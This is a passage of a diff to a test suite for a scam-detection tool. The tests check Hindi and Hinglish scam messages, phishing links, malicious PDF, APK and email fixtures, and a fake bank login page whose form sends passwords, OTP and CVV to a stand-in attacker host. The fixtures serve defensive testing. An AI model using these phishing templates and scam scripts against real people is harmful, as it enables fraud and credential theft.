@@ -159,7 +159,7 @@ def test_everyday_uses_of_threat_words(text):
     assert "threat" not in ids(text)
 
 
-@pytest.mark.parametrize("text", ["ok", "call me", "आपका खाता बंद हो जाएगा, तुरंत लिंक पर क्लिक करें"])
+@pytest.mark.parametrize("text", ["ok", "call me", "நாளைக்கு மாலை வீட்டுக்கு வா, அம்மா சமைத்திருக்கிறாள்"])
 def test_too_little_or_unreadable_text_is_insufficient(text):
     assert analyze(text).verdict == UNSURE
 
@@ -183,15 +183,69 @@ def test_styled_letters_are_normalised():
     assert normalize("ｆｒｅｅ 𝐆𝐈𝐅𝐓") == "free GIFT"
 
 
-@pytest.mark.parametrize("text,name,supported", [
-    ("Your account will be blocked", "English", True),
-    ("Aapka khata band ho jayega, jaldi KYC update karo", "Hinglish (romanised Hindi)", True),
-    ("आपका खाता बंद हो जाएगा", "Hindi / Marathi", False),
-    ("உங்கள் கணக்கு முடக்கப்படும்", "Tamil", False),
+@pytest.mark.parametrize("text,name,coverage", [
+    ("Your account will be blocked", "English", "full"),
+    ("Aapka khata band ho jayega, jaldi KYC update karo", "Hinglish (romanised Hindi)", "partial"),
+    ("Kal shaam ko ghar aa jaana, mummy ne khana banaya hai", "Hinglish (romanised Hindi)", "partial"),
+    ("आपका खाता बंद हो जाएगा", "Hindi / Marathi", "partial"),
+    ("உங்கள் கணக்கு முடக்கப்படும்", "Tamil", "none"),
+    ("Unga account block aagum, OTP sollunga illa problem", "Tamil written in English letters", "none"),
+    ("Meeru OTP cheppandi, ledu ante account block", "Telugu written in English letters", "none"),
 ])
-def test_language_detection(text, name, supported):
+def test_language_detection(text, name, coverage):
     lang = detect_language(text)
-    assert (lang.name, lang.supported) == (name, supported)
+    assert (lang.name, lang.coverage) == (name, coverage)
+
+
+def test_mixed_script_messages_are_reported_as_mixed():
+    lang = detect_language("Your OTP is 4821, ओटीपी किसी को न बताएं")
+    assert "mixed" in lang.name or "with" in lang.name
+    assert len(lang.mix) == 2 and lang.coverage == "partial"
+
+
+# --- Hinglish and Hindi detection (lexicon.py) ------------------------------------------------------
+@pytest.mark.parametrize("text,expected_rule", [
+    ("Aapka bank khata aaj band ho jayega. Turant KYC update karo aur OTP batao.", "asks_secret"),
+    ("Mummy mera phone kho gaya, ye naya number hai. Jaldi 20000 bhej do, papa ko mat batana", "new_number_family"),
+    ("आपका बैंक खाता आज बंद हो जाएगा। तुरंत केवाईसी अपडेट करें और ओटीपी बताएं।", "asks_secret"),
+    ("मैं साइबर क्राइम से बोल रहा हूं। आपके नाम पर केस दर्ज है, वीडियो कॉल पर रहिए", "digital_arrest"),
+    ("Galti se aapko 5000 bhej diye, please wapas kar do", "sent_by_mistake"),
+    ("मैंने गलती से आपको 5000 रुपये भेज दिए, कृपया वापस कर दीजिए", "sent_by_mistake"),
+    ("Ghar baithe roz 3000 kamao, bas videos like karo", "easy_job"),
+])
+def test_hindi_and_hinglish_scam_phrases(text, expected_rule):
+    r = analyze(text)
+    assert expected_rule in {s.id for s in r.signals}
+    assert r.verdict in (SCAM, CAREFUL)
+
+
+@pytest.mark.parametrize("text", [
+    "Aapka bank khata aaj band ho jayega. Turant KYC update karo aur OTP batao.",
+    "Mummy mera phone kho gaya, ye naya number hai. Jaldi 20000 bhej do, papa ko mat batana",
+])
+def test_hinglish_scams_are_no_longer_missed(text):
+    assert analyze(text).verdict == SCAM   # both were "No obvious threat detected" before
+
+
+@pytest.mark.parametrize("text", [
+    "Kal shaam ko ghar aa jaana, mummy ne khana banaya hai",
+    "Beta 500 bhej do auto ke liye, shaam ko de dungi",          # small family request, not a scam
+    "482915 aapka OTP hai. Ise kisi ko na batayein. -SBI",        # genuine OTP in Hinglish
+    "482915 आपका ओटीपी है। इसे किसी के साथ साझा न करें। - एसबीआई",   # genuine OTP in Hindi
+])
+def test_genuine_hindi_and_hinglish_messages_are_not_flagged(text):
+    assert analyze(text).verdict not in (SCAM, CAREFUL)
+
+
+def test_partly_covered_languages_never_get_high_confidence():
+    r = analyze("आपका बैंक खाता आज बंद हो जाएगा। तुरंत केवाईसी अपडेट करें और ओटीपी बताएं।")
+    assert r.verdict == SCAM and r.report.confidence != "High"
+    assert any("common Hindi scam phrases" in m for m in r.report.missing_information)
+
+
+def test_uncovered_languages_say_so_instead_of_guessing():
+    r = analyze("நாளைக்கு மாலை வீட்டுக்கு வா, அம்மா சமைத்திருக்கிறாள்")
+    assert r.verdict == UNSURE and "can't read" in r.detail
 
 
 @pytest.mark.parametrize("chat", [
@@ -236,9 +290,21 @@ def test_reputation_is_off_by_default():
     assert lookup("http://example-unique-test.xyz") == "not checked"
 
 
-def test_blocklisted_link_is_critical(monkeypatch):
+def _fake_sources(monkeypatch, result="unsafe", calls=None):
+    """Replace the online threat databases with a fake one (no network)."""
     import scamshield.reputation as rep
-    monkeypatch.setattr(rep, "lookup", lambda url: "unsafe")
+    def fake(url, key):
+        if calls is not None:
+            calls.append(url)
+        return result
+    monkeypatch.setenv("GOOGLE_SAFE_BROWSING_KEY", "test")
+    monkeypatch.setattr(rep, "SOURCES", [("Google Safe Browsing", "GOOGLE_SAFE_BROWSING_KEY", fake)])
+    monkeypatch.setattr(rep, "domain_age_days", lambda domain: None)
+    monkeypatch.setattr(rep, "_cache", rep.TTLCache())
+
+
+def test_blocklisted_link_is_critical(monkeypatch):
+    _fake_sources(monkeypatch, "unsafe")
     r = analyze("Hi, see the photos from the trip here: http://trip-photos-share.com/album", online=True)
     assert r.verdict == SCAM
     assert any(u.reputation == "unsafe" for u in r.report.urls)
@@ -381,6 +447,7 @@ from scamshield.links import inspect_link  # noqa: E402
     ("http://45.12.9.1/bank", "Dangerous"),
     ("files.example.in/PM-Kisan.apk", "Dangerous"),
     ("https://reward-claim-now.com/sbi/redeem", "Suspicious"),
+    ("https://some-random-blog.com/recipes", "Not verified"),         # unknown is never "safe"
 ])
 def test_link_verdicts(url, verdict):
     assert inspect_link(url).verdict == verdict
@@ -550,19 +617,16 @@ def test_reputation_cache_expires():
 
 # --- two-stage pipeline ----------------------------------------------------------------------------------------
 def test_stage_two_runs_only_when_needed_and_allowed(monkeypatch):
-    import scamshield.reputation as rep
     from scamshield.analyzer import check
     calls = []
-    monkeypatch.setenv("GOOGLE_SAFE_BROWSING_KEY", "test")
-    monkeypatch.setattr(rep, "_query", lambda url, key: calls.append(url) or "not listed")
-    rep._cache = rep.TTLCache()
+    _fake_sources(monkeypatch, "not listed", calls)
     uncertain = "Hi, see the photos from the trip here: http://trip-photos-share.com/album"
     check(uncertain, allow_online=False)
     assert calls == []                               # never without permission
     check("Share the OTP and update KYC at http://sbi-kyc.example.xyz now, account blocked", allow_online=True)
     assert calls == []                               # stage 1 was already conclusive
     r = check(uncertain, allow_online=True)
-    assert len(calls) == 1 and len(r.report.analysis["stages"]) == 2
+    assert len(calls) >= 1 and len(r.report.analysis["stages"]) == 2
 
 
 def test_long_input_is_limited():
@@ -831,3 +895,590 @@ def test_evidence_checklist_matches_what_happened():
 def test_links_lose_trailing_punctuation():
     from scamshield.links import find_links
     assert find_links("Go to http://x.example.xyz. Or bit.ly/abc!") == ["http://x.example.xyz", "bit.ly/abc"]
+
+
+# --- file inspection layer ----------------------------------------------------------------------------------------------
+import io  # noqa: E402
+
+from scamshield import inspectors  # noqa: E402
+from scamshield.files import inspect_upload  # noqa: E402
+from tests.fixtures.make_apk import make_apk  # noqa: E402
+from tests.fixtures.make_pdf import make_pdf  # noqa: E402
+
+
+def _check_file(data, name):
+    from scamshield.analyzer import check
+    fr = inspect_upload(data, name)
+    src = "photo" if fr.kind == "image" else "text"
+    return fr, check(fr.text or f"Attached file: {name}", source=src, extra_signals=fr.signals,
+                     attachments=[fr.summary()])
+
+
+def _qr_image(payload, caption):
+    import zxingcpp
+    from PIL import Image, ImageDraw, ImageFont
+    q = zxingcpp.create_barcode(payload, zxingcpp.BarcodeFormat.QRCode).to_image(scale=8)
+    q = q if isinstance(q, Image.Image) else Image.fromarray(q)
+    im = Image.new("RGB", (max(q.width + 80, 640), q.height + 160), "white")
+    ImageDraw.Draw(im).text((30, 30), caption, fill="black", font=ImageFont.load_default(size=26))
+    im.paste(q.convert("RGB"), (40, 110))
+    buf = io.BytesIO()
+    im.save(buf, "PNG")
+    return buf.getvalue()
+
+
+@pytest.mark.parametrize("data,kind", [
+    (b"\x89PNG\r\n\x1a\n" + b"\0" * 20, "image"),
+    (b"%PDF-1.4\n...", "pdf"),
+    (b"ID3\x03\x00" + b"\0" * 20, "audio"),
+    (b"\0\0\0\x18ftypmp42" + b"\0" * 20, "video"),
+    (b"From: a@b.com\nTo: c@d.com\nSubject: hi\nDate: today\n\nbody", "email"),
+    (b"MZ\x90\x00 windows program", "unknown"),
+])
+def test_files_are_identified_by_content(data, kind):
+    assert inspectors.classify(data) == kind
+
+
+def test_apk_is_identified_even_if_renamed():
+    apk = make_apk("com.example.app", ["android.permission.INTERNET"])
+    assert inspectors.classify(apk) == "apk"   # the name doesn't matter
+
+
+def test_upi_qr_parsing():
+    upi = inspectors.parse_upi("upi://pay?pa=refund.desk@ybl&pn=Amazon%20Refund&am=4999")
+    assert upi == {"action": "pay", "payee_id": "refund.desk@ybl", "payee_name": "Amazon Refund",
+                   "amount": "4999", "note": ""}
+
+
+def test_refund_qr_that_actually_pays_is_a_scam():
+    from scamshield import ocr
+    if not ocr.available():
+        pytest.skip("needs OCR (Tesseract) to read the 'receive your refund' caption next to the QR code")
+    fr, r = _check_file(_qr_image("upi://pay?pa=refund.desk@ybl&pn=Refund&am=4999",
+                                  "Scan this QR to receive your refund"), "refund.png")
+    assert r.verdict == SCAM and any("SENDS" in f for f in fr.facts)
+
+
+def test_shop_qr_alone_is_not_called_a_scam():
+    _, r = _check_file(_qr_image("upi://pay?pa=sharmastores@okaxis&pn=Sharma%20Stores", "Sharma Stores"), "shop.png")
+    assert r.verdict not in (SCAM, CAREFUL)
+
+
+def test_malicious_pdf_is_caught_without_running_it():
+    pdf = make_pdf(["ARREST WARRANT", "You are under digital arrest.", "Transfer your savings to verify."],
+                   javascript="app.alert('x')", link="http://rbi-verify.example.top/pay")
+    fr, r = _check_file(pdf, "warrant.pdf")
+    assert r.verdict == SCAM
+    assert {"pdf_javascript", "pdf_auto_link"} <= {s["id"] for s in fr.signals}
+    assert any("rbi-verify.example.top" in f for f in fr.facts)
+
+
+def test_pdf_launch_action_is_flagged():
+    fr, _ = _check_file(make_pdf(["Invoice"], launch=True), "invoice.pdf")
+    assert "pdf_launch" in {s["id"] for s in fr.signals}
+
+
+def test_ordinary_pdf_is_cleared():
+    pdf = make_pdf(["Electricity bill for October 2026", "Consumer number 1234567, amount due Rs 1,140",
+                    "Due date 20 November 2026. Pay via the official app or website."])
+    _, r = _check_file(pdf, "bill.pdf")
+    assert r.verdict == SAFE
+
+
+def test_apk_permissions_are_read_without_installing():
+    apk = make_apk("com.sbi.rewards.update", ["android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
+                                              "android.permission.BIND_ACCESSIBILITY_SERVICE"])
+    fr, r = _check_file(apk, "SBI_Rewards.apk")
+    # Evidence read from the file itself is near-certain, so High; and never lowered because the
+    # ML model can't judge the placeholder text "Attached file: SBI_Rewards.apk".
+    assert r.verdict == SCAM and r.report.confidence == "High"
+    assert {"apk_file", "apk_reads_sms", "apk_accessibility"} <= {s["id"] for s in fr.signals}
+    assert "Phishing link" not in r.report.scam_types       # package names aren't web links
+    assert sum("read your SMS" in f or "read SMS" in f for f in fr.facts) == 1   # no duplicate line
+
+
+def test_apk_zip_bomb_is_refused():
+    import zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("AndroidManifest.xml", b"\0" * (3 * 1024 * 1024))
+    with pytest.raises(UnsafeInput, match="unusual way"):
+        inspect_upload(buf.getvalue(), "bomb.apk")
+
+
+def _eml(frm, subject, body, attach=None, reply_to=None, auth=None):
+    from email.message import EmailMessage
+    m = EmailMessage()
+    m["From"], m["To"], m["Subject"], m["Date"] = frm, "you@example.com", subject, "Mon, 2 Nov 2026 10:00:00 +0530"
+    if reply_to:
+        m["Reply-To"] = reply_to
+    if auth:
+        m["Authentication-Results"] = auth
+    m.set_content(body)
+    if attach:
+        m.add_attachment(b"MZ", maintype="application", subtype="octet-stream", filename=attach)
+    return bytes(m)
+
+
+def test_phishing_email_is_caught():
+    eml = _eml("SBI Bank Security <sbi.alerts.kyc@gmail.com>", "KYC pending", "Your account will be blocked today.",
+               attach="Statement.pdf.exe", reply_to="verify@sbi-kyc.example.top", auth="mx; spf=fail; dmarc=fail")
+    fr, r = _check_file(eml, "kyc.eml")
+    assert r.verdict == SCAM
+    assert {"email_sender_spoof", "email_reply_elsewhere", "email_auth_fail",
+            "email_risky_attachment"} <= {s["id"] for s in fr.signals}
+
+
+def test_ordinary_email_is_cleared():
+    _, r = _check_file(_eml("Priya Sharma <priya.sharma@gmail.com>", "Photos", "Here are the photos from Sunday. "
+                            "See you next week at the usual place."), "photos.eml")
+    assert r.verdict == SAFE
+
+
+def test_payment_screenshot_alone_is_a_hint_not_a_verdict():
+    facts, signals = inspectors.payment_screenshot_findings("Payment Successful Rs 50,000 UPI transaction ID 4123")
+    assert facts and signals[0]["strength"] < 0.5
+
+
+def test_audio_gets_guidance_not_a_fake_verdict():
+    fr = inspect_upload(b"ID3\x03\x00" + b"\0" * 200, "voice.mp3")
+    assert fr.kind == "audio" and not fr.signals and any("cloned" in f or "copied with AI" in f for f in fr.facts)
+
+
+@pytest.mark.parametrize("data", [b"PK\x03\x04" + b"\0" * 50, b"MZ\x90\x00 program"])
+def test_unsupported_or_broken_files_are_refused(data):
+    with pytest.raises(UnsafeInput):
+        inspect_upload(data, "file.png")
+
+
+def test_sandbox_times_out(monkeypatch):
+    from scamshield import sandbox
+    with pytest.raises(sandbox.SandboxError, match="too long"):
+        sandbox.run_isolated("pdf", make_pdf(["x"]), timeout=0.001)
+
+
+def test_inspector_signals_all_have_risk_categories():
+    import re as _re
+    from scamshield.risk import CATEGORY_OF
+    ids = set(_re.findall(r'_sig\("([a-z_]+)"', open("scamshield/inspectors.py", encoding="utf-8").read()))
+    ids |= {v[0] for v in inspectors.DANGEROUS_PERMISSIONS.values()}
+    assert ids <= set(CATEGORY_OF)
+
+
+# --- preprocessing: hidden links, normalisation, OCR confidence, timestamps ---------------------------
+from scamshield.links import refang  # noqa: E402
+
+
+@pytest.mark.parametrize("text,link", [
+    ("Update KYC at sbi-kyc[.]example[.]xyz now", "sbi-kyc.example.xyz"),
+    ("Login hxxps://sbi-verify . top/login", "https://sbi-verify.top/login"),
+    ("Visit secure(dot)hdfc-alerts(dot)com", "secure.hdfc-alerts.com"),
+    ("Check sbi . co . in", "sbi.co.in"),
+])
+def test_disguised_links_are_restored_and_flagged(text, link):
+    from scamshield.links import find_links
+    assert link in find_links(text)
+    assert "disguised_link" in ids(text)
+
+
+@pytest.mark.parametrize("text", ["See you at 5. Great work today.", "Price is 1.5 lakh. OK"])
+def test_ordinary_punctuation_is_not_a_disguised_link(text):
+    assert not refang(text)[1]
+
+
+def test_same_phone_number_in_different_formats_is_one_entity():
+    from scamshield import entities
+    phones = entities.find_phones("Call +91 98765 43210 or 9876543210 or 098765-43210 or +91-9876543210")
+    assert [p.normalized for p in phones] == ["+919876543210"]
+
+
+def test_upi_ids_and_emails_are_normalised():
+    from scamshield import entities
+    assert entities.find_payment_ids("Pay Fraud.Desk@YBL or fraud.desk@ybl") == ["fraud.desk@ybl"]
+    assert entities.find_emails("Mail HELP@Example.com") == ["help@example.com"]
+
+
+def test_lookalike_domains_show_their_real_letters():
+    from scamshield.links import analyze_urls
+    u = analyze_urls("Login at https://xn--pple-43d.com/login")[0]
+    assert u.display_host == "\u0430pple.com"   # Cyrillic а, not Latin a
+
+
+def test_unreadable_photo_is_never_cleared():
+    from scamshield.analyzer import check
+    r = check("Them: 3942 00) 00339 Coe sou wood com", source="photo", ocr_quality=45)
+    assert r.verdict == UNSURE and r.report.confidence == "Low"
+    assert any("clearer screenshot" in m for m in r.report.missing_information)
+
+
+def test_clear_photo_scam_still_detected():
+    from scamshield.analyzer import check
+    r = check("Your SBI account will be blocked today. Share the OTP to unblock.", source="photo", ocr_quality=95)
+    assert r.verdict == SCAM
+
+
+def test_chat_export_keeps_dates_and_shows_how_long_trust_was_built():
+    chat = ("02/10/26, 9:14 pm - Meera: Hello, is this Dr. Gupta's clinic?\n02/10/26, 9:20 pm - You: No, wrong number\n"
+            "03/10/26, 8:02 am - Meera: So sorry! You seem kind. What do you do?\n03/10/26, 8:30 am - You: Engineer\n"
+            "19/10/26, 7:45 pm - Meera: My mentor taught me crypto trading, I made 40% profit on the app\n"
+            "19/10/26, 7:46 pm - Meera: Shall I add you to the group?\ncontinued on a new line")
+    c = analyze(chat).report.conversation
+    assert c["time_span_days"] == 17 and "over 17 days" in c["conversation_findings"][0]
+    assert c["timeline"][4]["when"] == "19/10/26, 7:45 pm"
+    assert c["timeline"][-1]["text"].endswith("continued on a new line")
+
+
+def test_us_style_dates_fall_back_sensibly():
+    from scamshield.preprocess import _parse_day
+    assert _parse_day("13/10/26").month == 10 and _parse_day("10/13/26").month == 10
+
+
+# --- specialised detectors and routing -------------------------------------------------------------
+@pytest.mark.parametrize("text,rule", [
+    ("You have a payment request of Rs 2,000 from Amazon Pay. Approve the request to receive your cashback.",
+     "collect_request"),
+    ("To activate your new account, pay just Rs 1 to verify your UPI.", "tiny_verification_payment"),
+    ("Pay Rs 500 processing charge to release your refund amount today.", "pay_to_receive"),
+])
+def test_payment_tricks(text, rule):
+    r = analyze(text)
+    assert rule in {s.id for s in r.signals} and r.verdict in (SCAM, CAREFUL)
+
+
+def test_collect_request_was_previously_unrecognised_and_is_now_a_scam():
+    r = analyze("You have a payment request of Rs 2,000 from Amazon Pay. Approve the request to receive your cashback.")
+    assert r.verdict == SCAM
+
+
+@pytest.mark.parametrize("text,rule", [
+    ("Dear customer, your SBI KYC is pending. Pay the Rs 99 charge to sbi.kyc.update@ybl today.", "brand_in_payment_id"),
+    ("SBI Customer Care: your card is blocked. Call our helpdesk on 98765 43210 to unblock.",
+     "official_uses_personal_number"),
+    ("This is HDFC Bank. Send your documents to hdfc.kyc.desk@gmail.com to avoid suspension.", "brand_in_email"),
+    ("Your card is blocked, call 98765 43210 immediately. -SBI", "official_uses_personal_number"),
+])
+def test_identity_mismatches(text, rule):
+    r = analyze(text)
+    # A lone fake email address is one piece of evidence ("Be careful"); with a payment
+    # request or threat alongside it, it becomes "Likely a scam".
+    assert rule in {s.id for s in r.signals} and r.verdict in (SCAM, CAREFUL) and r.report.identity_checks
+
+
+@pytest.mark.parametrize("text", [
+    "My SBI card isn't working at the ATM, can you call me at 98765 43210?",
+    "I called HDFC customer care yesterday, call me at 98765 43210 and I'll tell you",
+    "Dinner was 900, send your share to rahul.k@ybl when you can",
+])
+def test_mentioning_a_bank_or_sharing_a_upi_id_is_not_impersonation(text):
+    r = analyze(text)
+    assert not ({s.id for s in r.signals} & {"official_uses_personal_number", "official_asks_upi_payment",
+                                             "brand_in_payment_id"})
+    assert r.verdict not in (SCAM, CAREFUL)
+
+
+def test_email_domains_are_not_mistaken_for_links():
+    from scamshield.links import find_links
+    assert find_links("Mail hdfc.kyc.desk@gmail.com or visit www.hdfcbank.com") == ["www.hdfcbank.com"]
+
+
+def test_intents_say_what_they_want_in_plain_words():
+    r = analyze("Dear customer, your SBI KYC is pending. Pay the Rs 99 update charge to sbi.kyc.update@ybl today.")
+    assert {"action": "Pay or transfer money", "detail": "Rs 99 to sbi.kyc.update@ybl"} == \
+        {k: r.report.intents[0][k] for k in ("action", "detail")}
+
+
+@pytest.mark.parametrize("text,amount", [("Pay Rs 25,000 now", 25000), ("₹4999 refund", 4999),
+                                         ("send 2 lakh rupees", None), ("Rs 1.5 lakh", 150000),
+                                         ("5000 rupaye bhej do", 5000)])
+def test_amounts_are_understood(text, amount):
+    from scamshield.intent import find_amounts
+    got = find_amounts(text)
+    assert (got[0] if got else None) == amount
+
+
+def test_pressure_tactics_are_named():
+    r = analyze("This is Mumbai Cyber Crime. You are under digital arrest. Stay on the video call and don't tell your family.")
+    levers = {t["lever"] for t in r.report.pressure_tactics}
+    assert {"Fear", "Authority", "Isolation"} <= levers
+
+
+def test_scarcity_is_recognised():
+    assert "scarcity" in {s.id for s in analyze("Only 3 seats left in our trading course! Offer ends tonight.").signals}
+
+
+def test_router_skips_irrelevant_detectors_and_records_why():
+    r = analyze("Are we still meeting for lunch on Sunday?")
+    ran = {m["module"]: m["ran"] for m in r.report.modules}
+    assert ran["Rule engine"] and not ran["URL intelligence"] and not ran["Attachment scanner"]
+    assert not ran["Context engine"] and not ran["Payment detector"]
+    r = analyze("Priya: Hi\nYou: Hello\nPriya: Pay Rs 500 to riya@ybl, visit http://x.example.top")
+    ran = {m["module"]: m["ran"] for m in r.report.modules}
+    assert ran["URL intelligence"] and ran["Context engine"] and ran["Payment detector"] and ran["Identity intelligence"]
+
+
+def test_family_message_says_what_the_scammer_wants():
+    from scamshield.analyzer import check
+    r = check("Dear customer, your SBI KYC is pending. Pay the Rs 99 update charge to sbi.kyc.update@ybl today.")
+    assert "They want me to: Pay or transfer money (Rs 99 to sbi.kyc.update@ybl)" in circle.family_message(r)
+
+
+# --- URL intelligence: four stages -------------------------------------------------------------------------
+from scamshield import urlintel  # noqa: E402
+
+SBI_LOOKALIKE = "ѕbі.co.in".encode("idna").decode()   # Cyrillic ѕ and і
+
+
+@pytest.mark.parametrize("url,verdict,finding", [
+    (f"https://{SBI_LOOKALIKE}/kyc", "Dangerous", "fake_brand_link"),          # look-alike letters imitating SBI
+    ("https://xn--pple-43d.com/verify", "Dangerous", "homograph"),            # mixed alphabets
+    ("http://www.sbi.co.in@login-secure.top/kyc", "Dangerous", "url_userinfo"),  # the @ trick
+    ("https://www.google.com/url?q=http://indiapost-fee.example.top", "Dangerous", "open_redirect"),
+    ("https://sbi.co.in.secure-verify.example.com/pay", "Dangerous", "fake_brand_link"),
+    ("https://some-random-blog.com/recipes", "Not verified", None),
+    ("https://www.onlinesbi.sbi", "Official website", None),
+])
+def test_url_stages(url, verdict, finding):
+    r = urlintel.analyse(url)
+    assert r.verdict == verdict
+    if finding:
+        assert finding in {f.id for f in r.all_findings()}
+
+
+def test_lookalike_letters_are_mapped_back_to_the_brand():
+    assert urlintel.skeleton(SBI_LOOKALIKE) == "sbi.co.in"
+
+
+def test_official_site_used_as_a_redirect_is_not_called_official():
+    r = urlintel.analyse("https://www.google.com/url?q=http://indiapost-fee.example.top")
+    assert r.verdict != "Official website" and r.redirects_to.host == "indiapost-fee.example.top"
+    assert not any(f.level == "good" for f in r.all_findings())
+
+
+@pytest.mark.parametrize("url", [
+    f"https://{SBI_LOOKALIKE}/kyc", "http://www.sbi.co.in@login-secure.top/kyc",
+    "https://www.google.com/url?q=http://indiapost-fee.example.top", "https://sbi.co.in.secure-verify.example.com/pay",
+    "https://www.onlinesbi.sbi", "https://some-random-blog.com/recipes", "bit.ly/3xYz",
+])
+def test_message_checker_and_link_tab_agree(url):
+    """Both use the same pipeline, so a link is dangerous in a message exactly when it is in the Link tab."""
+    link_verdict = inspect_link(url).verdict
+    msg = analyze(f"Please check this: {url}")
+    link_flags = {s.id for s in msg.signals} & {"fake_brand_link", "homograph", "url_userinfo", "open_redirect",
+                                                "odd_link", "short_link", "brand_mismatch"}
+    assert bool(link_flags) == (link_verdict in ("Dangerous", "Suspicious"))
+
+
+def test_unknown_link_is_never_presented_as_safe():
+    r = inspect_link("https://some-random-blog.com/recipes")
+    assert r.verdict == "Not verified"
+    assert any("doesn't" in i.text.lower() or "not" in i.text.lower() for i in r.indicators)
+
+
+def test_not_listed_in_databases_is_reported_as_not_verified(monkeypatch):
+    _fake_sources(monkeypatch, "not listed")
+    r = urlintel.analyse("https://some-random-blog.com/recipes", online=True)
+    assert r.verdict == "Not verified"
+    assert any("does NOT mean it's safe" in f.text for f in r.all_findings())
+
+
+def test_any_database_hit_makes_a_link_dangerous(monkeypatch):
+    _fake_sources(monkeypatch, "unsafe")
+    assert urlintel.analyse("https://some-random-blog.com/recipes", online=True).verdict == "Dangerous"
+
+
+def test_a_failing_database_means_not_checked_not_safe(monkeypatch):
+    import scamshield.reputation as rep
+    def broken(url, key):
+        raise TimeoutError
+    monkeypatch.setenv("URLHAUS_AUTH_KEY", "test")
+    monkeypatch.setattr(rep, "SOURCES", [("URLhaus", "URLHAUS_AUTH_KEY", broken)])
+    monkeypatch.setattr(rep, "domain_age_days", lambda d: None)
+    monkeypatch.setattr(rep, "_cache", rep.TTLCache())
+    assert rep.check("https://x.example.com", "example.com", online=True).status == "not checked"
+
+
+@pytest.mark.parametrize("days,level", [(2, "danger"), (15, "warning"), (900, "info")])
+def test_new_domains_are_a_warning_sign(monkeypatch, days, level):
+    import scamshield.reputation as rep
+    monkeypatch.setattr(rep, "SOURCES", [])
+    monkeypatch.setattr(rep, "domain_age_days", lambda d: days)
+    found = [f for f in rep.findings("https://fresh-site.example.com", "fresh-site.example.com", True)
+             if "registered" in f.text or "existed" in f.text]
+    assert found and found[0].level == level
+
+
+def test_local_blocklist_works_offline(monkeypatch):
+    import scamshield.reputation as rep
+    monkeypatch.setattr(rep, "_blocklist", {"confirmed-scam.example.top"})
+    r = urlintel.analyse("https://confirmed-scam.example.top/pay", online=False)
+    assert r.verdict == "Dangerous" and any("Jagratha blocklist" in f.text for f in r.all_findings())
+
+
+def test_reputation_sources_parse_their_responses(monkeypatch):
+    import scamshield.reputation as rep
+    monkeypatch.setattr(rep, "_post_json", lambda url, body=None, form=None, headers=None:
+                        {"matches": [1]} if "safebrowsing" in url else
+                        {"query_status": "ok"} if "urlhaus" in url else
+                        {"results": {"in_database": True, "valid": True}})
+    monkeypatch.setattr(rep, "_get_json", lambda url: {"threat": {"threatTypes": ["SOCIAL_ENGINEERING"]}})
+    for fn in (rep.safe_browsing, rep.web_risk, rep.urlhaus, rep.phishtank):
+        assert fn("http://x.example.top", "key") == "unsafe"
+
+
+# --- stage 4: destination ---------------------------------------------------------------------------------------
+FAKE_SBI_PAGE = b"""<html><head><title>SBI Online - Update KYC</title>
+<script>var x = eval(atob('ZG9jdW1lbnQud3JpdGUoJ2hpJyk='));</script></head>
+<body><form action="https://collect-data.example.top/save.php"><input name="username">
+<input type="password" name="password"><input name="otp" placeholder="Enter OTP"><input name="cvv"></form>
+<a href="/files/SBI_Yono.apk">Download our new app</a></body></html>"""
+
+
+def test_fake_login_page_is_recognised_without_running_it():
+    found = {f["id"] for f in inspectors.inspect_html(FAKE_SBI_PAGE, "https://sbi-kyc.example.xyz/login")["signals"]}
+    assert {"dest_brand_mismatch", "dest_sensitive_fields", "dest_form_elsewhere", "dest_obfuscated_code",
+            "dest_apk_download"} <= found
+
+
+def test_page_that_only_mentions_a_brand_is_not_a_fake():
+    page = b"<html><head><title>My recipe blog</title></head><body>SBI interest rates went up.</body></html>"
+    assert inspectors.inspect_html(page, "https://some-random-blog.com/r")["signals"] == []
+
+
+def test_ordinary_login_page_is_a_note_not_a_warning():
+    page = b"<html><head><title>Sign in</title></head><body><form><input type=password name=password></form></body></html>"
+    levels = {f["level"] for f in inspectors.inspect_html(page, "https://example.org/login")["signals"]}
+    assert levels <= {"info"}
+
+
+def test_destination_catches_a_link_that_downloads_an_app(monkeypatch):
+    from scamshield import destination, redirects
+    monkeypatch.setattr(redirects, "fetch", lambda url: {
+        "chain": [{"url": url, "status": 200}], "final_url": url, "status": 200,
+        "content_type": "application/vnd.android.package-archive", "disposition": "", "body": b"PK", "stopped": ""})
+    assert destination.inspect_destination("https://update-app.example.com/get").verdict == "Dangerous"
+
+
+def test_destination_inspects_html_in_the_sandbox(monkeypatch):
+    from scamshield import destination, redirects
+    monkeypatch.setattr(redirects, "fetch", lambda url: {
+        "chain": [{"url": url, "status": 200}], "final_url": "https://sbi-kyc.example.xyz/login", "status": 200,
+        "content_type": "text/html", "disposition": "", "body": FAKE_SBI_PAGE, "stopped": ""})
+    d = destination.inspect_destination("https://bit.ly/abc")
+    assert d.verdict == "Dangerous" and any(f["id"] == "dest_sensitive_fields" for f in d.findings)
+
+
+def test_destination_fetch_refuses_internal_addresses():
+    from scamshield.redirects import fetch
+    for url in ("http://127.0.0.1/admin", "http://169.254.169.254/latest", "http://10.0.0.5/"):
+        page = fetch(url)
+        assert page["status"] is None and "not followed" in page["stopped"]
+
+
+# --- risk aggregation: dedup, reliability, correlation, contradictions, harm, outcomes --------------
+from scamshield.risk import Signal as RSignal, assess as r_assess, gather  # noqa: E402
+
+
+def test_the_word_bank_alone_adds_no_risk():
+    r = analyze("Your bank statement for October is ready. View it in the app.")
+    assert r.risk_score == 0 and r.verdict == SAFE
+
+
+def test_one_link_counted_once_even_if_it_shows_two_tactics():
+    r = analyze("SBI: your statement is ready, view it at https://statements-portal.com/view")
+    counted = [c for c in r.categories if c.present and c.independent]
+    repeated = [c for c in r.categories if c.present and not c.independent and c.same_as]
+    assert len(counted) == 1 and repeated and repeated[0].same_as == "Impersonation"
+    assert r.verdict == CAREFUL        # one piece of evidence, not "backed up by other evidence"
+
+
+def test_related_indicators_combine_into_a_known_pattern():
+    r = analyze("Dear customer, your SBI account will be suspended today. Verify at https://sbi-kyc.example.xyz "
+                "and share the OTP you receive.")
+    assert r.verdict == SCAM and r.report.confidence == "High"
+    assert r.report.chains and r.report.chains[0]["pattern"] == "Impersonation to steal your codes"
+    counted = {c.category.key for c in r.categories if c.present and c.independent}
+    assert {"credential_theft", "impersonation", "urgency"} <= counted
+
+
+def test_same_rule_in_two_categories_counts_once():
